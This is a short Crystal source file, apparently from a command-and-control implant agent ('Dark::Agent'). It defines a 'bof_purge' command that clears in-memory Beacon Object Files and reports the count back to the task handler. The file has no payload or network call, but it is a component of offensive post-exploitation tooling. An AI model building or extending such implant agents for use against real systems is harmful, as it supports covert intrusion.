require "./base"

module Dark::Agent::Commands
  class BofPurge < Base
    def name : String
      "bof_purge"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      
      count = bof_registry.purge
      
      MessageHandler.add_response(task_id, :success, "Purged #{count} BOFs from memory")
    end
  end
end